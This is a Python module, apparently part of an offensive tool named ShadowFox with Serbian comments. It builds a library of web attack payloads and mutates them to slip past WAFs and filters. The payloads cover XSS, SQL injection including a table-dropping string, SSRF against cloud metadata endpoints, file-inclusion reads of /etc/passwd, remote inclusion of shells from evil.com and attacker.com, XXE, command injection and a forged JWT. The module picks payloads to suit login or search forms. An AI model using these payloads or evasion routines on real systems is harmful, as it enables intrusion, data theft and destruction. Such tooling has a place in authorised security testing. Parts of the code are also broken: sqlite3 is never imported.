# shadowfox/agents/mutation_engine.py

import random
import string
import base64
import urllib.parse
import html
import re
import json
from typing import Dict, List, Any, Optional
import hashlib
import itertools
from datetime import datetime
import logging

class MutationEngine:
    """
    MutationEngine - Generiše i mutira payload-e za različite tipove napada
    Koristi AI-driven logiku za kreiranje efikasnijih payload-a
    """
    
    def __init__(self, operator):
        self.operator = operator
        self.logger = logging.getLogger('MutationEngine')
        
        # Inicijalni payload templates
        self._init_payload_library()
        
        # Encoding tehnike
        self.encodings = [
            'url', 'double_url', 'html', 'unicode', 'base64', 
            'hex', 'mixed_case', 'null_byte', 'comment_obfuscation'
        ]
        
        # Bypass tehnike
        self.bypass_techniques = {
            'waf_bypass': ['/**/'],
            'filter_bypass': ['--+', '#', '/*', '*/', ';%00'],
            'case_variation': True,
            'encoding_variation': True
        }
    
    def _init_payload_library(self):
        """Inicijalizuje osnovnu biblioteku payload-a"""
        self.base_payloads = {
            'XSS': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<details open ontoggle=alert(1)>',
                '"><script>alert(1)</script>',
                "';alert(1);//",
                '`${alert(1)}`',
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>'
            ],
            'SQLi': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "' AND 1=1--",
                "' AND 1=2--",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' OR 'x'='x",
                "' OR 'something' LIKE 's%",
                "' OR 1=1 LIMIT 1--",
                "'; DROP TABLE users--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "' OR SLEEP(5)--",
                "' OR pg_sleep(5)--",
                "1' ORDER BY 1--",
                "1' ORDER BY 100--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            'SSRF': [
                'http://127.0.0.1:80/',
                'http://localhost:22/',
                'http://169.254.169.254/',
                'http://metadata.google.internal/',
                'https://169.254.169.254/latest/meta-data/',
                'file:///etc/passwd',
                'file:///proc/version',
                'file:///windows/system32/drivers/etc/hosts',
                'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
                'dict://127.0.0.1:11211/',
                'sftp://127.0.0.1:22/',
                'ldap://127.0.0.1:389/',
                'ftp://127.0.0.1:21/'
            ],
            'LFI': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '../../../proc/version',
                '../../../var/log/apache2/access.log',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd',
                '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
                '/etc/passwd%00',
                '../../../etc/passwd%00.jpg',
                'php://filter/convert.base64-encode/resource=../../../etc/passwd',
                'php://input',
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+'
            ],
            'RFI': [
                'http://evil.com/shell.txt',
                'https://pastebin.com/raw/malicious',
                'ftp://attacker.com/shell.php',
                'http://127.0.0.1/shell.php',
                'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='
            ],
            'XXE': [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://169.254.169.254/">]><data>&file;</data>'
            ],
            'Command_Injection': [
                '; ls -la',
                '| whoami',
                '`whoami`',
                '$(whoami)',
                '; cat /etc/passwd',
                '| cat /etc/passwd',
                '`cat /etc/passwd`',
                '$(cat /etc/passwd)',
                '; ping -c 4 127.0.0.1',
                '| ping -c 4 127.0.0.1',
                '&& whoami',
                '|| whoami',
                '; sleep 10',
                '| sleep 10'
            ],
            'JWT': [
                'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbiBVc2VyIiwicm9sZSI6ImFkbWluIn0.invalid_signature'
            ],
            'LDAP': [
                '*)(uid=*))(|(uid=*',
                '*)(|(password=*))',
                '*)(&(password=*)',
                '*))(|(cn=*',
                '*))(|(mail=*'
            ],
            'NoSQL': [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$regex": ".*"}',
                '{"$where": "this.username == this.password"}',
                '{"$or": [{"username": {"$exists": true}}, {"password": {"$exists": true}}]}'
            ]
        }
    
    def generate_mutations(self, payload_type: str, base_payload: str = None, count: int = 10) -> List[Dict]:
        """
        Generiše mutirane verzije payload-a
        """
        if not base_payload:
            base_payloads = self.base_payloads.get(payload_type, [])
            if not base_payloads:
                self.logger.error(f"Nepoznat tip payload-a: {payload_type}")
                return []
            base_payload = random.choice(base_payloads)
        
        mutations = []
        mutation_id = 0
        
        # Dodaj originalni payload
        mutations.append({
            'id': mutation_id,
            'payload': base_payload,
            'technique': 'original',
            'encoding': 'none',
            'description': 'Original payload'
        })
        mutation_id += 1
        
        # Generiši mutations
        for _ in range(count - 1):
            mutation = self._create_mutation(base_payload, payload_type)
            mutation['id'] = mutation_id
            mutations.append(mutation)
            mutation_id += 1
        
        # Loguj u bazu
        self.operator.log_agent_action("MutationEngine", "mutations_generated", {
            "payload_type": payload_type,
            "base_payload": base_payload[:50] + "..." if len(base_payload) > 50 else base_payload,
            "mutation_count": len(mutations)
        })
        
        return mutations
    
    def _create_mutation(self, base_payload: str, payload_type: str) -> Dict:
        """
        Kreira jednu mutaciju osnovnog payload-a
        """
        techniques = [
            'encoding',
            'case_variation',
            'comment_injection',
            'null_byte_insertion',
            'double_encoding',
            'waf_bypass',
            'concatenation',
            'padding'
        ]
        
        technique = random.choice(techniques)
        mutated_payload = base_payload
        encoding_used = 'none'
        
        if technique == 'encoding':
            encoding = random.choice(self.encodings)
            mutated_payload = self._apply_encoding(base_payload, encoding)
            encoding_used = encoding
            
        elif technique == 'case_variation':
            mutated_payload = self._vary_case(base_payload)
            
        elif technique == 'comment_injection':
            mutated_payload = self._inject_comments(base_payload, payload_type)
            
        elif technique == 'null_byte_insertion':
            mutated_payload = self._insert_null_bytes(base_payload)
            
        elif technique == 'double_encoding':
            first_encoding = random.choice(self.encodings)
            temp_payload = self._apply_encoding(base_payload, first_encoding)
            second_encoding = random.choice(self.encodings)
            mutated_payload = self._apply_encoding(temp_payload, second_encoding)
            encoding_used = f"{first_encoding}+{second_encoding}"
            
        elif technique == 'waf_bypass':
            mutated_payload = self._apply_waf_bypass(base_payload, payload_type)
            
        elif technique == 'concatenation':
            mutated_payload = self._apply_concatenation(base_payload, payload_type)
            
        elif technique == 'padding':
            mutated_payload = self._apply_padding(base_payload)
        
        return {
            'payload': mutated_payload,
            'technique': technique,
            'encoding': encoding_used,
            'description': f"Mutated using {technique}"
        }
    
    def _apply_encoding(self, payload: str, encoding: str) -> str:
        """Primenjuje različite encoding tehnike"""
        try:
            if encoding == 'url':
                return urllib.parse.quote(payload, safe='')
            
            elif encoding == 'double_url':
                return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
            
            elif encoding == 'html':
                return html.escape(payload)
            
            elif encoding == 'unicode':
                return ''.join(f'\\u{ord(c):04x}' for c in payload)
            
            elif encoding == 'base64':
                return base64.b64encode(payload.encode()).decode()
            
            elif encoding == 'hex':
                return ''.join(f'\\x{ord(c):02x}' for c in payload)
            
            elif encoding == 'mixed_case':
                return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
            
            elif encoding == 'null_byte':
                return payload + '%00'
            
            elif encoding == 'comment_obfuscation':
                return payload.replace(' ', '/**/')
            
        except Exception as e:
            self.logger.error(f"Greška pri encoding {encoding}: {e}")
            return payload
        
        return payload
    
    def _vary_case(self, payload: str) -> str:
        """Varijacija velikih i malih slova"""
        result = ""
        for char in payload:
            if char.isalpha():
                result += char.upper() if random.choice([True, False]) else char.lower()
            else:
                result += char
        return result
    
    def _inject_comments(self, payload: str, payload_type: str) -> str:
        """Ubacuje komentare za bypass filtera"""
        comments = {
            'SQLi': ['/**/', '--', '#', '/*comment*/'],
            'XSS': ['<!--', '-->', '/*', '*/'],
            'general': ['/**/', '/**/']
        }
        
        comment_list = comments.get(payload_type, comments['general'])
        comment = random.choice(comment_list)
        
        # Ubaci komentar na random poziciju
        if len(payload) > 5:
            pos = random.randint(1, len(payload) - 1)
            return payload[:pos] + comment + payload[pos:]
        
        return payload + comment
    
    def _insert_null_bytes(self, payload: str) -> str:
        """Ubacuje null byte-ove"""
        null_variants = ['%00', '\x00', '\\0', '\0']
        null_byte = random.choice(null_variants)
        
        # Ubaci na random poziciju ili na kraj
        if random.choice([True, False]) and len(payload) > 3:
            pos = random.randint(1, len(payload) - 1)
            return payload[:pos] + null_byte + payload[pos:]
        else:
            return payload + null_byte
    
    def _apply_waf_bypass(self, payload: str, payload_type: str) -> str:
        """Primenjuje WAF bypass tehnike"""
        if payload_type == 'SQLi':
            # SQL WAF bypass
            bypasses = [
                payload.replace(' ', '/**/'),
                payload.replace('=', '/**/=/**/'),
                payload.replace('OR', 'OR/**/'),
                payload.replace('UNION', 'UNION/**/'),
                payload.replace(' ', '+'),
                payload.replace("'", "''")
            ]
            return random.choice(bypasses)
        
        elif payload_type == 'XSS':
            # XSS WAF bypass
            bypasses = [
                payload.replace('<', '&lt;').replace('>', '&gt;'),
                payload.replace('script', 'scr\u0069pt'),
                payload.replace('alert', 'ale\u0072t'),
                payload.replace('"', '&quot;'),
                payload.replace("'", '&#x27;')
            ]
            return random.choice(bypasses)
        
        return payload
    
    def _apply_concatenation(self, payload: str, payload_type: str) -> str:
        """Primenjuje string concatenation tehnike"""
        if payload_type == 'SQLi':
            # SQL concatenation
            if 'SELECT' in payload.upper():
                return payload.replace('SELECT', 'SEL'+'ECT')
            elif 'UNION' in payload.upper():
                return payload.replace('UNION', 'UNI'+'ON')
        
        elif payload_type == 'XSS':
            # JavaScript concatenation
            if 'alert' in payload:
                return payload.replace('alert', 'ale'+'rt')
            elif 'script' in payload:
                return payload.replace('script', 'scr'+'ipt')
        
        return payload
    
    def _apply_padding(self, payload: str) -> str:
        """Dodaje padding za bypass length restrictions"""
        paddings = [
            ' ' * random.randint(1, 10),
            '\t' * random.randint(1, 5),
            '\n' * random.randint(1, 3),
            'A' * random.randint(5, 20)
        ]
        
        padding = random.choice(paddings)
        position = random.choice(['start', 'end', 'both'])
        
        if position == 'start':
            return padding + payload
        elif position == 'end':
            return payload + padding
        else:
            return padding + payload + padding
    
    def generate_smart_mutations(self, payload_type: str, context: Dict = None) -> List[Dict]:
        """
        Generiše pametne mutacije na osnovu konteksta (form fields, URL params, etc.)
        """
        if not context:
            context = {}
            
        smart_mutations = []
        
        # Odaberi base payload na osnovu konteksta
        base_payloads = self._select_contextual_payloads(payload_type, context)
        
        for base_payload in base_payloads[:3]:  # Top 3 payload-a
            mutations = self.generate_mutations(payload_type, base_payload, 5)
            smart_mutations.extend(mutations)
        
        return smart_mutations
    
    def _select_contextual_payloads(self, payload_type: str, context: Dict) -> List[str]:
        """
        Bira payload-e na osnovu konteksta (form type, parameter name, etc.)
        """
        all_payloads = self.base_payloads.get(payload_type, [])
        
        if not context:
            return all_payloads[:5]  # Vrati top 5 ako nema konteksta
        
        # Kontekstualno filtriranje
        contextual_payloads = []
        
        param_name = context.get('param_name', '').lower()
        form_action = context.get('form_action', '').lower()
        input_type = context.get('input_type', '').lower()
        
        if payload_type == 'XSS':
            if input_type in ['text', 'search', 'email']:
                # Preferiraj payload-e za text inpute
                contextual_payloads = [p for p in all_payloads if '<input' in p or 'onfocus' in p]
            elif 'comment' in param_name or 'message' in param_name:
                # Za komentare, preferiraj osnovne XSS payload-e
                contextual_payloads = [p for p in all_payloads if '<script>' in p or 'alert(' in p]
        
        elif payload_type == 'SQLi':
            if 'login' in form_action or 'auth' in form_action:
                # Za login forme, preferiraj authentication bypass
                contextual_payloads = [p for p in all_payloads if 'admin' in p or '1=1' in p]
            elif 'search' in param_name or 'id' in param_name:
                # Za search/id parametre, preferiraj UNION based
                contextual_payloads = [p for p in all_payloads if 'UNION' in p or 'ORDER BY' in p]
        
        # Ako nema kontekstualnih, vrati sve
        return contextual_payloads if contextual_payloads else all_payloads[:10]
    
    def save_payload_to_library(self, payload: str, payload_type: str, success_rate: float = 0.0, description: str = ""):
        """
        Čuva uspešan payload u biblioteku za buduće korišćenje
        """
        try:
            with sqlite3.connect(self.operator.shadowfox_db) as conn:
                conn.execute('''
                    INSERT INTO payload_library (payload_type, payload, description, success_rate)
                    VALUES (?, ?, ?, ?)
                ''', (payload_type, payload, description, success_rate))
            
            self.logger.info(f"Payload sačuvan u biblioteku: {payload_type}")
            
        except Exception as e:
            self.logger.error(f"Greška pri čuvanju payload-a: {e}")
    
    def get_best_payloads(self, payload_type: str, limit: int = 10) -> List[Dict]:
        """
        Vraća najbolje payload-e iz biblioteke na osnovu success rate-a
        """
        return self.operator.get_payloads_by_type(payload_type)[:limit]
    
    def create_payload_variants(self, base_payload: str, variant_count: int = 5) -> List[str]:
        """
        Kreira varijante payload-a kombinovanjem različitih tehnika
        """
        variants = [base_payload]  # Originalni
        
        # Kombinuj različite tehnike
        techniques = ['encoding', 'case_variation', 'waf_bypass', 'padding']
        
        for _ in range(variant_count - 1):
            current_payload = base_payload
            
            # Primeni 1-3 random tehnike
            num_techniques = random.randint(1, 3)
            selected_techniques = random.sample(techniques, num_techniques)
            
            for technique in selected_techniques:
                if technique == 'encoding':
                    encoding = random.choice(self.encodings[:5])  # Koristi osnovne encoding-e
                    current_payload = self._apply_encoding(current_payload, encoding)
                elif technique == 'case_variation':
                    current_payload = self._vary_case(current_payload)
                elif technique == 'waf_bypass':
                    current_payload = self._apply_waf_bypass(current_payload, 'general')
                elif technique == 'padding':
                    current_payload = self._apply_padding(current_payload)
            
            variants.append(current_payload)
        
        return variants

# Test funkcionalnosti
if __name__ == "__main__":
    import sys
    sys.path.append('..')
    
    from core.operator import ShadowFoxOperator
    
    # Test
    op = ShadowFoxOperator()
    mutation_engine = MutationEngine(op)
    
    # Test generisanja mutacija
    xss_mutations = mutation_engine.generate_mutations('XSS', count=5)
    print("XSS Mutacije:")
    for mut in xss_mutations:
        print(f"  {mut['id']}: {mut['payload']} ({mut['technique']})")
    
    print("\nSQL Mutacije:")
    sql_mutations = mutation_engine.generate_mutations('SQLi', count=5)
    for mut in sql_mutations:
        print(f"  {mut['id']}: {mut['payload']} ({mut['technique']})")
